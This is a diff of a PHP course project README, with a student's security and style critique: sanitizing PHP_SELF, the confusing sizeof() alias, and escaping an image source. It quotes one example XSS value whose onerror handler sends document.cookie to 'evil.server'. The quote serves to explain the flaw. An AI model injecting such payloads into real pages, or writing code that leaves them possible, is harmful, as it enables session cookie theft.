@@ -32,13 +32,13 @@ checkmate in terms of security) </br>
 -I always use "filter_input(INPUT_SERVER, 'PHP_SELF', FILTER_SANITIZE_URL);" on PHP_SELF... just like exec(), it is some kind of red alert for me </br>
 -Aside frome critique, I cannot expect one course to cover all sorts of topics, including frontend, security and so on... It is lengthy enough as a good learning project
 and good enough for me to show it off that Ive completed it </br>
--EDIT: Been going through code again (since I completed the course some time ago and now im just registering my work) and just noticed 
+- EDIT: Been going through code again (since I completed the course some time ago and now im just registering my work) and just noticed 
 use of sizeof() alias for count()... It is a bad habit bc it cofuses people who know laguages like C/C++ and expect information of memory allocated from such name...
 To be honsest, I have no idea what the creators of PHP had in mind creating such a confusing alias. There are a lot of tricky things that exist both in C and PHP - 
 some function names, for(;;) loop, printf("%d", printf("Hello world!")), passing parameters by reference like in C++ and so on... So why name something not
 related to memory allocation at all sizeof - I dont know. But I believe one should just not use this alias at all. </br>
 - EDIT: In this project we used hard-coded default profile picture, but if it was some real project I would probably make sure that in line here: </br>
-<img src='$coverPhotoSrc' class='coverPhoto'></br>
+\<img src='$coverPhotoSrc' class='coverPhoto'\></br>
 $coverPhotoSrc variable will never turn into something like: ' onerror="this.src='http://evil.server/exploit.php?'+document.cookie" />. </br>
 It is always better to double check everything, especially if it was some real life scenario and not Udemy course project, that much I know...
 
